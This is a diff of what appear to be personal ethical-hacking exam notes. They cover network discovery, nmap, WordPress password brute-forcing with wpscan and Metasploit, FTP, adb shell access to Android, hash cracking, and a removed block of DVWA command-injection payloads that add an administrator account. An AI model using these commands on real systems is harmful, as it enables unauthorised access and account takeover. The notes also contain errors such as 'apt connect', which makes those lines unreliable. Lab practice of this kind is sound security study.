@@ -1,9 +1,12 @@
 ### 1. Find the IP target.
  ```
-  $ ip addr
+  $ ip addr or
+  $ ifconfig
+  $ netdiscover -r IP/24
   $ netdiscover  (If not found $ apt-get install netdiscover)
   $ netdiscover -i eth0   (confirm from ifconfig which net/wifi using)
-  $ netdiscover -r IP/24  
+  
+ May be IP targets are same. For me, this is the IP (172.16.0.0/24) for my target.
  ```
 ### 2. Nmap scan all
   ```
@@ -31,6 +34,10 @@
   $ wpscan --url IP -u root -P passwdfile.txt
   
   --enumerate p, -U username, -P password, --usernames userlist.txt, --passwords passwdlist.txt
+  
+ I was faced problems with WP Scanner to bruteforicing, I recommend to use Metasploit for bruteforcing in Wordpress passwod.
+ keep it mind:- Password wordlist are like same but try to find exact password lists.
+  
  Using Metasploit==>
  => msfconsole 
 use axiliary/scanner/http/wordpress_login_enum
@@ -61,27 +68,25 @@ set USERNAME admin
 ```
 FTP Connect
   $ ftp IP
+  
+  After connect with FTP go to the file
+  $ get file.txt
+  $ get file1.txt
+
+When I was first connect from the parot server, I did'nt get the file. So I have connected from winodws machine, then i had got the file easily.   
  
 https://www.javatpoint.com/ftp-commands
 https://www.serv-u.com/linux-ftp-server/commands
 ```
-### 9. Prints the route that a packet takes to reach the host
-  $ traceroute google.com
-
 ### 10. Android
 ```
   $ netdiscover -r IP/24   (got final IP)
-  $ nmap -O IP
+  $ nmap IP -sV -p 5555
   
-  apt install adb
-  pip install colorama
-  git clone https://github.com/aerosol-can/PhoneSploit   (if not work use https://github.com/aerosol-can/PhoneSploit)
-  cd PhoneSploit
-  python3 phonesploit.py
-  select 3 to connect new phone
-  Add IP address of android device
-  4 (Access shell on phone)
-  IP address again of android device
+  apt install adb (if not available
+  Command:
+  $ apt connect IP:5555
+  $ adb shell
   pwd > ls > cd sdcard > ls > cd downloads > cat file.txt
 ```
 ### 11. Stegnography
@@ -104,7 +109,6 @@ https://hashes.com/en/decrypt/hash
 https://crackstation.net
 
   $ hash-identifier  ->Enter and paste the hash.
-  $ haiti -e <crypto_hash>    (https://noraj.github.io/haiti/#/pages/usage)
   $ Hashcat -a 3 -m 900 hash.txt /rockyou.txt
   -a attack mode (3)
   -m hashtype (select number fom below)
@@ -121,13 +125,12 @@ Veracrypt = Encryt / Decrypt the Hidden Disk
 Cryptool
 Snow
 Bctextencoder
-Md5 & sha1 checksum utility
+Md5 hash calculator
 Wpscan
 Nmap
 Metasploit
 Hydra
 Wireshark
-Winscp
 OWASP ZAP  
 RDP
 ```
@@ -138,25 +141,6 @@ Path: C:\wamp64\www\DVWA\hackable\uploads\maybefile
 
 View a file cmd: "type"
 Decrypt - https://hashes.com/en/decrypt/hash
-
-
-Severity: Low        Severity: Medium           Severity: High          
-1; ls                1& ls                      || ls
-1; id                1& net user                || net user
-1; net user
-| ls
-
- Others low Severity cmd: 
-| hostname
-| whoami
-| dir C:\path.txt
-| type path.txt
-| net user
-| net user Test /Add
-| net user
-| net user Test
-| net localgroup Administrators Test /Add
-Successfully created the "Test" user account.
 ```
 ### 15 SQL Injection with SQLmap:
   ```
